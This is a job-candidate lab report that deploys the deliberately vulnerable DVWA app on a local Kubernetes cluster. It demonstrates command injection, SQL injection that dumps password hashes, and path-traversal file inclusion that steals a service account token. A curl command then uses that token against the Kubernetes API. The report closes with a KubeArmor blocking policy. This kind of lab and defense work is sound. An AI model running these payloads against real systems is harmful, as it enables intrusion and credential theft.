# Problem Statement 2: Kubernetes DVWA Deployment & Attack Surface Execution Report

**Candidate:** Solution Engineer Trainee Candidate  
**Company:** AccuKnox  
**Target:** Damn Vulnerable Web Application (DVWA) running on Kubernetes  

---

## 1. Executive Overview

This technical report documents the complete deployment, exploitation, and Zero-Trust mitigation of the **Damn Vulnerable Web Application (DVWA)** deployed inside a local Kubernetes cluster.

### Key Objectives Achieved:
1. **Kubernetes Deployment:** Authored a clean, modern multi-container Pod architecture (`cytopia/dvwa:php-7.4` frontend + `mariadb:10.5` backend sharing `127.0.0.1` localhost network) with automated deployment scripts (`setup-cluster.ps1` / `setup-cluster.sh`).
2. **Execution of 3 Core Attack Surfaces:**
   - **Attack Surface 1: Command Injection (Remote Code Execution & Container Discovery)**
   - **Attack Surface 2: SQL Injection (Authentication Bypass & Credential Exfiltration)**
   - **Attack Surface 3: Local File Inclusion (LFI) to Exfiltrate Kubernetes Pod ServiceAccount JWT Tokens**
3. **Container & Cloud-Native Security Hardening:** Demonstrated how Linux Security Modules (LSMs) and **KubeArmor** active security policies prevent each attack vector at the kernel level.

---

## 2. Kubernetes Cluster Architecture & Deployment

### 2.1 Multi-Container Pod Architecture
The application is encapsulated within its own dedicated namespace `dvwa` to ensure multi-tenancy isolation.

```
┌────────────────────────────────────────────────────────────────────────┐
│ Kubernetes Pod: dvwa-app (Namespace: dvwa)                             │
│                                                                        │
│  ┌──────────────────────────────┐    ┌──────────────────────────────┐  │
│  │ Container 1: dvwa            │    │ Container 2: db              │  │
│  │ Image: cytopia/dvwa:php-7.4  │◄──►│ Image: mariadb:10.5          │  │
│  │ Port: 80 (HTTP)              │    │ Port: 3306 (MySQL)           │  │
│  └──────────────────────────────┘    └──────────────────────────────┘  │
│                                                                        │
│  Shared Network Namespace (localhost: 127.0.0.1)                       │
│  Mounted Volume: /var/run/secrets/kubernetes.io/serviceaccount/        │
└────────────────────────────────────────────────────────────────────────┘
```

- **Namespace:** `dvwa`
- **Deployment:** `dvwa-app`
  - Container 1: `dvwa` (`cytopia/dvwa:php-7.4`, Port: `80`)
  - Container 2: `db` (`mariadb:10.5`, Port: `3306`)
- **Service:** `dvwa-service` (Type: `NodePort`, NodePort: `30080`, TargetPort: `80`)

### 2.2 Deployment Steps

#### Step 1: Apply Manifests
```powershell
.\k8s-dvwa\setup-cluster.ps1
```

#### Step 2: Access Application
```powershell
& "$env:LOCALAPPDATA\Programs\DockerDesktop\resources\bin\kubectl.exe" port-forward -n dvwa svc/dvwa-service 8080:80
```
- **URL:** `http://localhost:8080`
- **Default Username:** `admin`
- **Default Password:** `password`

---

## 3. Live Demonstration & Execution of 3 Attack Surfaces

Automated execution against the live cluster was performed using `python k8s-dvwa/attack-demos/exploit_dvwa.py --url http://localhost:8080`.

---

### Attack Surface 1: Command Injection (Remote Code Execution & In-Pod Reconnaissance)

#### 1. Vulnerability Context
The DVWA "Command Injection" module passes user input from the `ip` parameter directly to the shell without sanitization (`shell_exec("ping -c 4 " . $target)`).

#### 2. Exploit Payloads
- **Basic RCE Payload:**
  ```text
  127.0.0.1; whoami; uname -a; id
  ```
- **Kubernetes Pod Reconnaissance Payload:**
  ```text
  127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null || cat /etc/hosts
  ```

#### 3. Live Execution Output
```text
======================================================================
ATTACK SURFACE 1: Command Injection (Remote Code Execution in K8s)
======================================================================
[*] Sending payload: 127.0.0.1; whoami; uname -a; id
[+] Command Output Received from Container:

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.68 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.059 ms
www-data
Linux dvwa-app-66d5b677b9-cwkpw 6.18.33.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun 18 21:54:43 UTC 2026 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data),8(mail)

[*] Probing Kubernetes Pod ServiceAccount & Network Metadata: 127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
[+] K8s Metadata Output:

total 4
drwxrwxrwt 3 root root  140 Oct  6 10:43 .
drwxr-xr-x 3 root root 4096 Oct  6 10:44 ..
lrwxrwxrwx 1 root root   13 Oct  6 10:43 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Oct  6 10:43 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Oct  6 10:43 token -> ..data/token
```

#### 4. Kubernetes Impact & Lateral Movement
- Confirms active shell execution as `www-data` inside the pod.
- Discovers the default mounted Kubernetes ServiceAccount credentials (`ca.crt`, `namespace`, `token`), allowing the attacker to prepare for API server escalation.

---

### Attack Surface 2: SQL Injection (Data Exfiltration & Credential Harvesting)

#### 1. Vulnerability Context
The DVWA "SQL Injection" module queries the database without parameterization:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

#### 2. Exploit Payload
```sql
1' UNION SELECT user, password FROM users #
```

#### 3. Live Execution Output
```text
======================================================================
ATTACK SURFACE 2: SQL Injection (Data & Password Hash Exfiltration)
======================================================================
[*] Sending SQLi Payload: 1' UNION SELECT user, password FROM users #
[+] Extracted User Database Records from MariaDB:
    - User: admin           Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
    - User: gordonb         Password Hash (MD5): e99a18c428cb38d5f260853678922e03
    - User: 1337            Password Hash (MD5): 8d3533d75ae2c3966d7e0d4fcc69216b
    - User: pablo           Password Hash (MD5): 0d107d09f5bbe40cade3de5c71e9e9b7
    - User: smithy          Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
```

#### 4. Credential Analysis:
- The hash `5f4dcc3b5aa765d61d8327deb882cf99` decrypts to `password`.
- The attacker extracts full application administrative credentials.

---

### Attack Surface 3: Local File Inclusion (LFI) to Kubernetes Token Theft

#### 1. Vulnerability Context
The DVWA "File Inclusion" module loads files via `include($_GET['page']);` without path traversal filtering.

#### 2. Exploit Payloads
1. **Reading Container System Users:**
   `http://localhost:8080/vulnerabilities/fi/?page=../../../../../etc/passwd`
2. **Exfiltrating the Kubernetes Pod ServiceAccount Token:**
   `http://localhost:8080/vulnerabilities/fi/?page=../../../../../var/run/secrets/kubernetes.io/serviceaccount/token`

#### 3. Live Execution Output
```text
======================================================================
ATTACK SURFACE 3: Local File Inclusion (LFI) & Kubernetes Token Theft
======================================================================
[*] [1/2] Attempting to read /etc/passwd via LFI: ../../../../../etc/passwd
[+] Successfully read container /etc/passwd via LFI:
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/bin/sh

[*] [2/2] Attempting to exfiltrate K8s Service Account Token via LFI: ../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
[+] CRITICAL: Kubernetes Pod JWT ServiceAccount Token successfully extracted!
    Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImJsTEM1aVFoM24xN...grEnFAjNvB3Lt_FkJwHg
    Impact: An attacker can query https://kubernetes.default.svc to escalate cluster privileges.
```

#### 4. The Cloud-Native Threat Escalation:
The attacker can immediately use the exfiltrated JWT token to query the Kubernetes API Server:
```bash
TOKEN="eyJhbGciOiJSUzI1Ni..."
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## 4. Zero-Trust Mitigation with AccuKnox & KubeArmor

We created a custom `KubeArmorPolicy` ([kubearmor-dvwa-security-policies.yaml](file:///c:/Users/Jaya%20Krishna%20Sai/Downloads/Projects/test/k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml)) to block these attacks at the kernel level:

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-dvwa-rce-and-token-theft
  namespace: dvwa
spec:
  severity: 1
  message: "Alert and Block malicious process execution and credential access in DVWA"
  selector:
    matchLabels:
      app: dvwa
  process:
    matchPaths:
      # Block arbitrary shell spawns (Blocks Command Injection RCE)
      - path: /bin/sh
        action: Block
      - path: /bin/bash
        action: Block
  file:
    matchDirectories:
      # Block read access to K8s ServiceAccount tokens (Blocks LFI Token Theft)
      - dir: /var/run/secrets/kubernetes.io/serviceaccount/
        recursive: true
        action: Block
    matchPaths:
      # Block access to system files
      - path: /etc/passwd
        action: Block
  action: Block
```

### Mitigation Impact:
1. **Command Injection Defeated:** When the attacker submits `; whoami` or `; /bin/bash`, the Linux kernel LSM interceptor immediately blocks `/bin/bash` with `Permission Denied (-EACCES)`.
2. **LFI Token Exfiltration Defeated:** When the PHP engine attempts to read `/var/run/secrets/kubernetes.io/serviceaccount/token` or `/etc/passwd`, KubeArmor blocks the system call and generates an audit alert to AccuKnox CNAPP.

---

## 5. Summary & Deliverables Index

| Artifact | Path / Location | Purpose |
| :--- | :--- | :--- |
| **K8s Manifests** | `k8s-dvwa/k8s-manifests/dvwa.yaml` | Multi-container DVWA Deployment & NodePort Service |
| **KubeArmor Policy** | `k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml` | Zero-Trust LSM policy blocking RCE & Token Theft |
| **Python Automated Exploit** | `k8s-dvwa/attack-demos/exploit_dvwa.py` | Full PoC for Command Injection, SQLi, and LFI Token Theft |
| **PowerShell Exploit** | `k8s-dvwa/attack-demos/exploit_dvwa.ps1` | Native Windows PowerShell exploit automation |
| **Cluster Setup Scripts** | `k8s-dvwa/setup-cluster.ps1` & `.sh` | Automated deployment script for local clusters |
